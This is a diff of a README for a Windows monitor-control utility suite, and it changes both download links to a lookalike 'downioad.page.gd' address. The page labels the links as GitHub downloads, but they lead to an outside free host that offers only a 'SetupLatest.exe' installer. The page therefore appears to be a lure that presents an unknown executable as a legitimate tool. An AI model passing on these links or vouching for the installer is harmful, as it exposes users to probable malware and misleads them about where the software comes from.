@@ -2,7 +2,7 @@
 
 ControlMyMonitor Advanced Utility Suite is a powerful tool designed to provide users with full control over their monitor settings. It offers an intuitive interface for adjusting display parameters, enhancing productivity, and ensuring optimal viewing experiences on Windows systems. This utility suite streamlines monitor management, making it accessible for both casual users and professionals seeking to fine-tune their display configurations.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -57,7 +57,7 @@ A5: Currently, only the installer version is provided through "SetupLatest.exe".
 
 To get the latest version of ControlMyMonitor Advanced Utility Suite, please visit the download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
